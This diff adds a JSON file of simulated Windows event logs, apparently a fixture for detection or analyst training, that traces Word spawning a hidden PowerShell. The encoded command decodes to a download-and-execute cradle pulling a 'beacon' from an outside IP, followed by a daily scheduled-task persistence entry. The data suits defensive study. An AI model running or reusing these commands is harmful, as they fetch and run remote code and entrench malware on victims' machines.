@@ -1,0 +1,52 @@
+[
+  {
+    "timestamp": "2026-06-09T18:05:00Z",
+    "hostname": "SEC-WORKSTATION",
+    "username": "analyst_bob",
+    "event_type": "Process",
+    "event_id": 4688,
+    "process": "winword.exe",
+    "pid": 3812,
+    "CommandLine": "C:\\Program Files\\Microsoft Office\\Office16\\winword.exe /n C:\\Users\\Public\\invoice.docx",
+    "ParentProcessName": "explorer.exe",
+    "ParentProcessId": 1200
+  },
+  {
+    "timestamp": "2026-06-09T18:05:05Z",
+    "hostname": "SEC-WORKSTATION",
+    "username": "analyst_bob",
+    "event_type": "Process",
+    "event_id": 4688,
+    "process": "powershell.exe",
+    "pid": 4821,
+    "CommandLine": "powershell.exe -nop -w hidden -enc aWV4IChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vMTg1LjIyMC4xMDEuNDcvYmVhY29uJykuLi4=",
+    "ParentProcessName": "C:\\Program Files\\Microsoft Office\\Office16\\winword.exe",
+    "ParentProcessId": 3812
+  },
+  {
+    "timestamp": "2026-06-09T18:05:10Z",
+    "hostname": "SEC-WORKSTATION",
+    "username": "system",
+    "event_type": "Network",
+    "event_id": 3,
+    "process": "powershell.exe",
+    "pid": 4821,
+    "CommandLine": "powershell.exe",
+    "NewProcessName": "powershell.exe",
+    "NewProcessId": 4821,
+    "DestinationPort": 443,
+    "DestinationIp": "185.220.101.47"
+  },
+  {
+    "timestamp": "2026-06-09T18:10:00Z",
+    "hostname": "SEC-WORKSTATION",
+    "username": "system",
+    "event_type": "Process",
+    "event_id": 4688,
+    "process": "schtasks.exe",
+    "pid": 5012,
+    "CommandLine": "schtasks /create /tn 'UpdateManagerTask' /tr 'C:\\Users\\Public\\svchost32.exe' /sc daily",
+    "ParentProcessName": "cmd.exe",
+    "ParentProcessId": 4821
+  }
+]
